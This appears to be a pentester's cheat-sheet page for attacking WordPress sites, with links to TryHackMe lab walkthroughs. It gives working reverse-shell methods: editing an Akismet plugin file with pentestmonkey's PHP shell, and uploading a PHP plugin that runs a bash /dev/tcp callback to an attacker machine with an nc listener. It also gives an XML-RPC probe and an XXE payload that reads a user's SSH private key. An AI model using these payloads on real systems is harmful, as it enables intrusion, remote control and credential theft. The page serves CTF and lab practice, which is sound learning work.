# Web







## Wordpress

### Reverse Shell #1 - Edit existing Plugin

**Examples**&#x20;

[#initial-shell](../../walkthroughs/tryhackme/wordpress-cve-2021-29447.md#initial-shell "mention")

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cp php-reverse-shell/php-reverse-shell.php .
subl php-reverse-shell.php 
```

Update the page with your reverse shell then save. This will make the plugin not appear anymore under Installed Plugins

<figure><img src="../../.gitbook/assets/image (1079).png" alt=""><figcaption></figcaption></figure>

Curl the page to activate it.

**Kali**

```
curl http://$VICTIM/wp-content/plugins/akismet/akismet.php
```

### Reverse Shell  #2 - Upload Plugin

**Examples**&#x20;

[mr-robot-ctf.md](../../walkthroughs/tryhackme/mr-robot-ctf.md "mention")[retro.md](../../walkthroughs/tryhackme/retro.md "mention")

**revshell.php code**

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");
?>
```

**Kali**

```
vi revshell.php
zip revshell.zip revshell.php
nc -lvnp 443
```





## XML-RPC

### Check if it is enabled

**Examples**

[retro.md](../../walkthroughs/tryhackme/retro.md "mention")

wpscan or a scan maybe able identified that xmlrpc.php exists, if it is check if it is enabled.

```
POST /$SITE/xmlrpc.php HTTP/1.1
Host: $VICTIM
Content-Length: 91

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

<figure><img src="../../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>

### View Files

**Examples**

[mustacchio.md](../../walkthroughs/tryhackme/mustacchio.md "mention")

**Input**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```





